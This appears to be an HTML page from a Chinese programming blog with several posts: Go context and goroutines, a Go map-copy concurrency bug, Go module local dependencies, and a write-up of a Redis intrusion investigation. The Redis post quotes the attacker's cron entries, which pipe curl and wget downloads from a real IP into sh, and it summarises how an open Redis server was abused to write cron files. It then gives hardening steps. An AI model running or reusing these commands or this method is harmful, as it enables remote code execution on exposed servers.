+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/learning-strategy/" rel="tag">learning strategy</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/anki/" rel="tag">anki</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/%E4%BD%BF%E7%94%A8context%E6%8E%A7%E5%88%B6%E5%A4%9A%E4%B8%AAgoroutine/" rel="bookmark">使用Context控制多个goroutine</a>
+  </h2>
+  
+    <time datetime="2020-11-19T11:47:32&#43;08:00">19 November, 2020</time>
+  
+</header>
+      
+        <p><a href="https://play.golang.org/p/RauyvzGUMHZ">Play</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;context&#34;</span>
+	<span style="color:#e6db74">&#34;time&#34;</span>
+)
+
+<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Foo</span> <span style="color:#66d9ef">struct</span> {
+	<span style="color:#a6e22e">ctx</span>    <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>
+	<span style="color:#a6e22e">cancel</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">CancelFunc</span>
+	<span style="color:#a6e22e">ch</span>     <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>
+}
+
+<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Foo</span>) <span style="color:#a6e22e">r1</span>() {
+	<span style="color:#66d9ef">for</span> {
+		<span style="color:#66d9ef">select</span> {
+		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ch</span>:
+			println(<span style="color:#e6db74">&#34;r1 print: &#34;</span>, <span style="color:#a6e22e">i</span>)
+		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Done</span>():
+			println(<span style="color:#e6db74">&#34;Foo.r1() routine exit&#34;</span>)
+			<span style="color:#66d9ef">return</span>
+		}
+	}
+}
+
+<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Foo</span>) <span style="color:#a6e22e">r2</span>() {
+	<span style="color:#66d9ef">for</span> {
+		<span style="color:#66d9ef">select</span> {
+		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ch</span>:
+			println(<span style="color:#e6db74">&#34;r2 print: &#34;</span>, <span style="color:#a6e22e">i</span>)
+		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Done</span>():
+			println(<span style="color:#e6db74">&#34;Foo.r2() routine exit&#34;</span>)
+			<span style="color:#66d9ef">return</span>
+		}
+	}
+}
+
+<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Foo</span>) <span style="color:#a6e22e">r3</span>() {
+	<span style="color:#66d9ef">for</span> {
+		<span style="color:#66d9ef">select</span> {
+		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ch</span>:
+			println(<span style="color:#e6db74">&#34;r3 print: &#34;</span>, <span style="color:#a6e22e">i</span>)
+		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Done</span>():
+			println(<span style="color:#e6db74">&#34;Foo.r3() routine exit&#34;</span>)
+			<span style="color:#66d9ef">return</span>
+		}
+	}
+}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithTimeout</span>(<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Background</span>(), <span style="color:#ae81ff">1</span><span style="color:#f92672">*</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Minute</span>)
+	<span style="color:#a6e22e">f</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Foo</span>{
+		<span style="color:#a6e22e">ch</span>:     make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>),
+		<span style="color:#a6e22e">ctx</span>:    <span style="color:#a6e22e">ctx</span>,
+		<span style="color:#a6e22e">cancel</span>: <span style="color:#a6e22e">cancel</span>,
+	}
+	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">r1</span>()
+	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">r2</span>()
+	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">r3</span>()
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
+		<span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">ch</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
+		<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">After</span>(<span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Millisecond</span>)
+	}
+	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">cancel</span>()
+	<span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">After</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+	println(<span style="color:#e6db74">&#34;main routine exit&#34;</span>)
+}
+</code></pre></div>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/golang/" rel="tag">golang</a>
+            </li>
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/context/" rel="tag">context</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/%E8%AE%B0%E4%B8%80%E6%AC%A1redis%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/" rel="bookmark">记一次redis攻击排查</a>
+  </h2>
+  
+    <time datetime="2020-10-15T16:18:14&#43;08:00">15 October, 2020</time>
+  
+</header>
+      
+        <h2 id="排查过程">排查过程</h2>
+<ul>
+<li>开发环境redis key反复丢失</li>
+<li>启用aof持久化方式，记录每一个写命令，重启redis服务器</li>
+<li>redis key再次丢失</li>
+<li>查看aof文件内容</li>
+<li>排查导致key被删除的命令，del无，出现flushall</li>
+<li>查看flushall周边命令
+<pre><code>  $8
+  flushall
+  *3
+  $3
+  set
+  $2
+  r1
+  $51
+
+
+  * * * * * root curl -fsS 94.237.85.89:8080/0|sh
+
+
+  *3
+  $3
+  set
+  $2
+  r2
+  $51
+
+
+  * * * * * root wget -qO- 94.237.85.89:8080/0|sh
+
+
+  *1
+  $8
+  flushall
+</code></pre></li>
+<li>外部客户端连接到了redis执行恶意命令，类似于https://github.com/redis/redis/issues/3594</li>
+<li>检查crontab列表
+<pre><code>crontab -l
+</code></pre><p>没发现定时任务，检查<a href="https://manpages.debian.org/stretch/cron/cron.8">cron</a>默认读取的目录文件:</p>
+<pre><code>ll /etc/cron.d
+total 12
+-rw-r--r--. 1 root root 128 Mar 31  2016 0hourly
+-rw-------  1 root root 235 Nov  6  2016 sysstat
+-rw-r--r--  1 root root 209 Oct 15 12:35 systemdd
+</code></pre><p><code>systemdd</code>这个文件今天更新过</p>
+<pre><code>REDIS0009�	redis-ver5.0.5�
+redis-bits�@�ctimeч_used-mem��H�
+                                 aof-preamble���r23
+  
+* * * * * root wget -qO- 94.237.85.89:8080/0|sh
+  
+r13
+  
+* * * * * root curl -fsS 94.237.85.89:8080/0|sh
+  
+��D��6-�
+</code></pre><p>乱码中看到了熟悉的“面孔”，果断删除文件。</p>
+</li>
+<li>检查crontab日志
+<pre><code>tail -f /var/log/cron
+Oct 15 15:40:01 sophonsitapp13 CROND[648]: (root) CMD (curl -fsS 94.237.85.89:8080/0|sh)
+Oct 15 15:40:01 sophonsitapp13 CROND[647]: (root) CMD (wget -qO- 94.237.85.89:8080/0|sh)
+</code></pre><p>还在每分钟执行一次，重启进程：</p>
+<pre><code>systemctl start crond.service
+</code></pre></li>
+<li>redis安全加固
+<ul>
+<li>禁用CONFIG、FLUSHDB、FLUSHALL命令</li>
+<li>换用一个陌生端口</li>
+<li>加密码（生产环境服务间通讯均是内网环境，所以无需密码）</li>
+<li>其他参考 <a href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="攻击方式总结">攻击方式总结</h2>
+<ul>
+<li>连接到暴露在公网的redis</li>
+<li>清空数据库</li>
+<li>设置cron文件名称</li>
+<li>设置定时任务
+<ul>
+<li>抓取外网bash脚本并执行</li>
+</ul>
+</li>
+<li>数据库写文件</li>
+<li>清空数据库</li>
+</ul>
+<h2 id="攻击生效的条件">攻击生效的条件</h2>
+<ul>
+<li>以root用户运行redis</li>
+<li>redis暴露公网且无密码</li>
+<li>使用了默认的6379</li>
+<li>允许执行FLUSHALL CONFIG SET SAVE等命令</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/111634439">https://zhuanlan.zhihu.com/p/111634439</a></li>
+<li><a href="https://github.com/redis/redis/issues/3594">https://github.com/redis/redis/issues/3594</a></li>
+<li><a href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a></li>
+</ul>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/go%E4%B8%AD%E5%A4%8D%E5%88%B6map%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E5%9D%91/" rel="bookmark">Go中复制map可能遇到坑</a>
+  </h2>
+  
+    <time datetime="2019-11-02T14:03:25&#43;08:00">2 November, 2019</time>
+  
+</header>
+      
+        <p>昨天下午遇到一个问题。服务A与服务B批量建立tcp连接，并定时发送rpc请求（rpc.Ping()）检查连接的健康状态。A服务在kibana出现报错：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use of closed network connection
+</code></pre></div><p>第一反应是B服务重启导致连接断开，正好落在A服务检查出错与重连的时间窗口。运维同学帮拉日志，发现错误：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;fatal error: concurrent map iteration and map write\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.771394863Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;[11/01/19 10:52:52] [DEBG] RouterRPC Put Request =\u003e \u0026{6076362058 1 200178629686 2fadfb7c24bb440cb9dfcb74f515baef server:1:currt:1572229900380812731:498081}\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stdout&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.771452423Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773643972Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;goroutine 62906840 [running]:\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773666216Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;runtime.throw(0x932fd7, 0x26)\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773672033Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;\u0009/app/go1.9/go/src/runtime/panic.go:605 +0x95 fp=0xc4202019a8 sp=0xc420201988 pc=0x42d1a5\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773676889Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;runtime.mapiternext(0xc420201ac8)\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773682159Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;\u0009/app/go1.9/go/src/runtime/hashmap.go:778 +0x6f1 fp=0xc420201a40 sp=0xc4202019a8 pc=0x40b7c1\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773686889Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;main.(*RouterRPC).AllRoomCount(0xc4201988c0, 0xc420b08630, 0xc420192158, 0x0, 0x0)\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773694133Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;\u0009/path/to/project/rpc.go:185 +0x161 fp=0xc420201b38 sp=0xc420201a40 pc=0x809421\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773704869Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;runtime.call64(0xc420187f20, 0xc420192078, 0xc420358b10, 0x1800000028)\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,<span style="color:#e6db74">&#34;time&#34;</span>:<span style="color:#e6db74">&#34;2019-11-01T02:52:52.773713993Z&#34;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;log&#34;</span>:<span style="color:#e6db74">&#34;\u0009/app/go1.9/go/src/runtime/asm_amd64.s:510 +0x3b fp=0xc420201b88 sp=0xc420201b38 pc=0x45b86b\n&#34;</span>,<span style="color:#e6db74">&#34;stream&#34;</span>:<span style="color:#e6db74">&#34;stderr&#34;</span>,
+...
+</code></pre></div><p>显示是并发读写map出错，看下这行代码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">rc</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">Demo</span>(<span style="color:#ae81ff">111</span>,<span style="color:#e6db74">&#34;foo&#34;</span>)
+<span style="color:#75715e">// /path/to/project/rpc.go:185
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">rid</span>, <span style="color:#a6e22e">count</span> = <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">rc</span> {
+    <span style="color:#a6e22e">rep</span>.<span style="color:#a6e22e">Counter</span>[<span style="color:#a6e22e">rid</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">count</span>
+}
+</code></pre></div><p><code>rc</code>的类型是<code>map[string]int32</code>，对它访问没加锁因为预期没有并发写，看下来源：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">B</span>) <span style="color:#a6e22e">Demo</span>(<span style="color:#a6e22e">s</span> <span style="color:#66d9ef">int32</span>, <span style="color:#a6e22e">a</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">rc</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int32</span>) {
+	<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">bLock</span>.<span style="color:#a6e22e">RLock</span>()
+	<span style="color:#a6e22e">rc</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int32</span>, len(<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">rc</span>))
+	<span style="color:#a6e22e">rc</span> = <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">rc</span>[<span style="color:#a6e22e">s</span>][<span style="color:#a6e22e">a</span>]
+	<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">bLock</span>.<span style="color:#a6e22e">RUnlock</span>()
+	<span style="color:#66d9ef">return</span>
+}
+</code></pre></div><p><code>b.rc</code>是一个会被并发读写的<code>map</code>，所以对它的读操作需加锁。问题出在赋值语句：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">rc</span> = <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">rc</span>[<span style="color:#a6e22e">s</span>][<span style="color:#a6e22e">a</span>]
+</code></pre></div><p><code>map</code>的本质是<code>*hmap</code>，即<code>hmap</code>类型的指针，所以变量<code>rc</code>和<code>b.rc[s][a]</code>中保存的是同一个指向底层<code>hmap</code>的地址。<code>Demo()</code>方法返回后，外面对该地址的读操作并没加锁，从而导致报错。这里代码的本意是复制<code>map</code>，只是用了错误的方法。正确的做法是循环遍历<code>map</code>的每个元素逐个赋值到新的<code>map</code>。例如：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">b</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">B</span>) <span style="color:#a6e22e">Demo</span>(<span style="color:#a6e22e">s</span> <span style="color:#66d9ef">int32</span>, <span style="color:#a6e22e">a</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">rc</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int32</span>) {
+	<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">bLock</span>.<span style="color:#a6e22e">RLock</span>()
+	<span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">rc</span>[<span style="color:#a6e22e">server</span>][<span style="color:#a6e22e">appId</span>]
+	<span style="color:#a6e22e">rc</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">int32</span>, len(<span style="color:#a6e22e">rc</span>))
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">rid</span>, <span style="color:#a6e22e">count</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">m</span> {
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">count</span> &gt; <span style="color:#ae81ff">0</span> {
+			<span style="color:#a6e22e">rc</span>[<span style="color:#a6e22e">rid</span>] = <span style="color:#a6e22e">count</span>
+		}
+	}
+	<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">bLock</span>.<span style="color:#a6e22e">RUnlock</span>()
+	<span style="color:#66d9ef">return</span>
+}
+</code></pre></div><p>微服务框架<code>go-micro</code>中的对头信息的<a href="https://github.com/micro/go-micro/blob/92b7d2db3bc9612a7f0feafbb7b801d180b5c3b3/metadata/metadata.go#L16">复制过程</a>可以作为参考。</p>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/go/" rel="tag">go</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/go-module%E6%9C%AC%E5%9C%B0%E4%BE%9D%E8%B5%96%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8E%A9%E6%B3%95/" rel="bookmark">Go Module本地依赖的两种玩法</a>
+  </h2>
+  
+    <time datetime="2019-06-23T11:34:55&#43;08:00">23 June, 2019</time>
+  
+</header>
+      
+        <h2 id="两种情况">两种情况</h2>
+<p>先看两种依赖关系，如下：</p>
+<ol>
+<li>同一<code>module</code>下的不同<code>package</code>依赖</li>
+<li>不同<code>module</code>下的不同<code>package</code>依赖</li>
+</ol>
+<p>第一种情况，假设<code>module</code>名称是<code>go_play</code>，<code>package</code>分别是<code>foo</code>、<code>bar</code>、<code>biz</code>则依赖关系简单表示为：</p>
+<p><img src="/images/local_same_module.png" alt=""></p>
+<p>第二种情况，假设两个<code>module</code>分别是<code>go_play</code>和<code>go_play_another</code>，新增的<code>package</code>是<code>baz</code>，则依赖关系简单表示为：</p>
+<p><img src="/images/local_diff_module.png" alt=""></p>
+<h2 id="解决方案">解决方案</h2>
+<h3 id="情况一">情况一</h3>
+<p>第一种情况，目录结构如下：</p>
+<pre><code>go_play
+├── bar
+│   └── bar.go
+├── biz
+│   └── biz.go
+├── foo
+│   └── foo.go
+├── go.mod
+├── play.go
+└── play_test.go
+</code></pre><p>初始化<code>module</code>的方法是：</p>
+<pre><code>go mod init go_play
+</code></pre><p>按照图中的依赖关系，可以用<code>module_name/package_name</code>的方式<code>import</code>同一<code>module</code>下的其他<code>package</code>，例如在<code>bar.go</code>中可以是：</p>
+<pre><code>package bar
+
+import (
+	&quot;fmt&quot;
+	_ &quot;go_play/biz&quot;
+)
+
+func init() {
+	fmt.Println(&quot;bar.....&quot;)
+}
+</code></pre><p>此时，如果<code>biz</code>中有<code>init</code>函数则执行之。</p>
+<h3 id="情况二">情况二</h3>
+<p>第二种情况，新增<code>module</code>，其目录结构：</p>
+<pre><code>go_play_another
+├── baz
+│   ├── baz.go
+│   └── baz_test.go
+└── go.mod
+</code></pre><p>可以用同样的方法（<code>module_name/package_name</code>）<code>import</code>其他<code>module</code>下的<code>package</code>，但需要在<code>go.mod</code>中声明依赖：</p>
+<pre><code>module go_play_another
+
+go 1.12
+
+require go_play v0.0.0
+
+replace go_play =&gt; ../go_play
+</code></pre><p>这里的关键是<code>replace</code>后的内容，将一个共享的<code>module</code>替换成本地<code>module</code>所在的目录。</p>
+      
+      
+
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/cs/" rel="tag">cs</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/go/" rel="tag">go</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+
+  
+
+
+  <nav>
+    
+      <a class="Pagination u-clickable" href="/page/2/" rel="prev">« Previous</a>
+    
+    
+  </nav>
+
+
+
+      </div>
+    </div>
+  </main>
+  
+  <footer class="Footer">
+    <div class="u-wrapper">
+      <div class="u-padding">
+        By 张乾坤
+      </div>
+    </div>
+  </footer>
+
+</body>
+
+</html>
